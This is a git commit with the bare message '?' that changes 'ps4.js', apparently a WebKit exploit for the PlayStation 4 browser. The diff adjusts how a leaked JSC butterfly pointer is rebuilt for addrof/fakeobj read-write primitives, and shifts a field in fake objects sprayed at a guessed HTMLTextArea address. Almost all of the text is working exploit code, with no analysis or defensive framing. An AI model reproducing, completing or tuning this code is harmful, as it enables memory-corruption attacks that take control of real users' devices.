ece3a68f3c77557cbd107958303dad12225f0323
tmetcarth <mellori246@gmail.com>
2021-03-02 19:31:19 +0000

    ?

--- ps4.js
+++ ps4.js
@@ -110,7 +110,7 @@ function setupRW() {
 	g_ab_slave.leakme = 0x1337;
 	var bf = 0;
 	for(var i = 15; i >= 8; i--)
-		bf = 512 * bf + g_relative_rw[g_ab_index + i];
+		bf = 256 * bf + g_relative_rw[g_ab_index + i];
 	g_jsview_butterfly = new Int64(bf);
 	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337")))
 		die("[!] Failed to setup addrof/fakeobj primitives");
@@ -333,7 +333,7 @@ function reuseTargetObj() {
 		let view = new Float64Array(ab);
 
 		view[1] = guess_htmltextarea_addr.asDouble();   // m_element
-		view[3] = guess_htmltextarea_addr.asDouble();   // m_bubble
+		view[2] = guess_htmltextarea_addr.asDouble();   // m_bubble
 
 		g_arr_ab_1.push(view);
 	}
